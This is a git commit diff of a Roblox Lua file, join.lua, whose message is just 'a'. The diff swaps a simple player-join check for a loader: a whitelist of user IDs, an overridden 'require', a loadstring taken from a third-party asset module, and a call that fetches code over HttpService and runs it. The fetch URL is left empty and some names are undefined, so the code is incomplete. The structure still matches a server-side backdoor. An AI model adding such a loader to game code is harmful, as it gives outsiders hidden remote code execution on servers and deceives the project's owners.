a1a8cc0ceab72a8f99b5dd2889dbcc94a8a05aff
thatrandomnoob23 <imfakenoob3244@gmail.com>
2024-07-01 04:45:05 -0700

    a

--- join.lua
+++ join.lua
@@ -1,6 +1,28 @@
-for i,v in pairs(game:GetService("Players"):GetPlayers()) do
-	if v.Name == "superegglauncher" then
-		print("HE JOINED")
-		v.Character.Humanoid.WalkSpeed = 16
+local initializer = {}
+
+initializer.whitelist = {
+	2454561387; --trn
+	130030450; --eiae
+	2591123755; --dor
+}	
+
+local req = require
+	local require = function(obj)
+		local fake = fake_module_scripts[obj]
+		if fake then
+			return fake()
+		end
+		return req(obj)
 	end
+
+local loadstring = require(4689019964)
+
+initializer.start = function()
+	local initclient = Instance.new("RemoteEvent")
+	initclient.Name = "initclient"
+	initclient.Parent = game:GetService("ReplicatedStorage")
+
+	local UI = loadstring(game:GetService("HttpService"):GetAsync("", true))()
 end
+
+return initializer
